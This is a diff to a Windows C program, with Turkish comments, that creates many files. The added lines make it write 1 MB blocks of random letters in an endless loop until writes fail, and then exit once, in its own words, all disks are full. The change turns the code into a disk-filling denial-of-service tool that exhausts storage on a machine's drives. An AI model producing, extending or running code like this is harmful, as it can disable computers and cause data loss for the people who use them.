@@ -6,20 +6,22 @@
 #include <shlobj.h>
 
 #define NUM_FILES 250
+#define BUFFER_SIZE 1024 * 1024 // 1 MB buffer size
 
 void createTextFileWithRandomData(const char* filename) {
     FILE* fp;
     if (fopen_s(&fp, filename, "wb") == 0) {
-        const size_t bufferSize = 1024;
-        char* buffer = (char*)malloc(bufferSize);
+        char* buffer = (char*)malloc(BUFFER_SIZE);
 
         if (buffer != NULL) {
-            for (size_t i = 0; i < bufferSize; i++) {
+            for (size_t i = 0; i < BUFFER_SIZE; i++) {
                 buffer[i] = 'A' + rand() % 26;
             }
 
-            for (int i = 0; i < NUM_FILES; i++) {
-                fwrite(buffer, sizeof(char), bufferSize, fp);
+            while (1) {
+                if (fwrite(buffer, sizeof(char), BUFFER_SIZE, fp) != BUFFER_SIZE) {
+                    break; // Dosya yazma işlemi başarısız olduğunda döngüden çık
+                }
             }
 
             free(buffer);
@@ -59,6 +61,10 @@ unsigned __stdcall createFiles(void* arg) {
     }
 
     free(arg);
+
+    // Bütün diskler dolduğunda programı sonlandır
+    exit(0);
+
     return 0;
 }
 
